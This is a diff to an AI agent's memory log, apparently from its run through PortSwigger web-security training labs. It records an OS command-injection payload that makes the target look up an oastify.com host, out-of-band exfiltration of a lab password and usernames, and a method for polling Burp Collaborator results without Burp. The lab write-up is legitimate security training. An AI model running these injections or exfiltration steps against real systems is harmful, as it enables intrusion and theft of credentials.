@@ -2,8 +2,8 @@
 metadata:
   node_type: memory
 name: "PRS Lab Campaign"
-description: "批52:4 题四个新假设全部干净证伪(productId 反射非 XSS、cookie 无规范形窗口、login 腿无观测能力、隧道空格头名与动作端点仍 401)"
-last_updated: 2026-10-08T09:08:49+08:00
+description: "批53:OOB 族 blocked 4 题全解 - 判定在到达 oastify 权威层(假设证实);外传型另需自持 secret 派生标签 + 轮询 polling.oastify.com 读回;新件 burp_collab,header_scan v1.1.0 加常量头"
+last_updated: 2026-10-08T09:50:47+08:00
 created: 2026-10-06T22:18:05+08:00
 ---
 
@@ -233,4 +233,28 @@ Batch 50(4 stuck 攻击批 · pH 三工作台蒸馏处方落地后首攻):**1 so
 方法论沉淀:面对「一切面都干净」的 lab,本轮四题的价值都在**把假设钉死**(证伪比新线索更省下一批的重复劳动);把「从未打过的半区/从未用过的观测原语」当检查表逐项关掉,是 stuck 池复攻的正确节奏。
 
 环境:沙箱网络本轮再起两次 stall(`os error 11` / status-line timeout),`nap 20` 后必恢复;实例 40 分钟寿命依旧(本轮 4 题全部重 launch,均换新域名)。
+
+
+## 2026-10-08
+
+## 2026-10-08T09:5x 批53:blocked 池 OOB 族 4 题全解(假设证实 + 读取面打通)
+
+- 用户裁定:seed 知识解题,警惕过拟合;题 1 先单点探针,证实后铺 2-4。结果 **4/4 solved**,progress 从 114/5/4 起。
+- **核心假设「判定在查询到达 oastify 权威层」:证实**。题 1(/web-security/os-command-injection/lab-blind-out-of-band)一发
+  `email=x@a.com||nslookup b53p1a2b.oastify.com||`(随机编造子域)→ 8s 后横幅 is-solved + congrats。无需持有子域、无需 Burp。
+- **但假设只覆盖检测面**:外传型三题(题 2 OS 命令 whoami、题 3 Oracle 口令、题 4 Shellshock 用户名)不翻;
+  随机子域的数据埋在一个**不可轮询**的标签里,而只把交互打过去不足以提交正确答案(`/submitSolution` 返回 `{"correct":false}`)。
+- **真正的解锁 = 公开 Burp Collaborator 可无 Burp 轮询**:自持 32B secret → base64 即 biid;标签由
+  `key_hash=SHA1→base36(ALPHABET=a..z0..9)前20 → 10+chk+10+chk(chk=Σord%36)` 拼 `"1g"+hex(n)+"y"+…+"z"`,
+  过两寄存器 salt 密码得 30 字符标签;`GET https://polling.oastify.com/burpresults?biid=<urlenc b64>` 取 JSON
+  `{"responses":[…]}`;`subDomain` 首标签即外传数据;**交互读出即消费**。随机标签可达但不可读。
+- 三题实测外传值:题2 `peter-9ebGxU`→submit correct;题3 口令 `x4liu9axa11acxn72yfr`→administrator 登录 302→is-solved;
+  题4 `peter-GTB7NH`(Shellshock)→submit correct。
+- **新件**:`.pi-rs/rust-scripts/burp_collab.rs`(project 层,new/poll/list/--selftest;selftest 5/5 命中,跨实现互证)。
+  **改件**:`hunter-suite/header_scan.rs` v1.1.0 加 `--header 'K: V'...` 常量头(题4 需"Referer 变 + User-Agent 恒定"),
+  已跑 `npm --prefix packages/rs-agent run rust:catalog`。未 git 提交(`git status`:catalog.json、header_scan.rs、.pi-rs)。
+- **坑**:自测 DNS 必须走系统解析器——直接向 8.8.8.8 发 UDP A 查询会被缓存应答,权威收不到,poll 恒空(首版 selftest 即踩)。
+  本机 getent 对随机 oastify 子域偶发瞬时 NXDOMAIN,不能据此判标签无效。cookie 值不能含 `;`(故题3 选 UTL_INADDR 形而非 XXE 形)。
+- 知识回写:4 条 record 改写为 solved 终态;新增 `burp-collaborator-public-polling-method`;`oob-callback-family` 与
+  `prs-c2coe-oob-collaborator-verdict` 补"两半:到达即判定 / 自持标签可读回",旧「结构性不可解」判词已推翻。
 
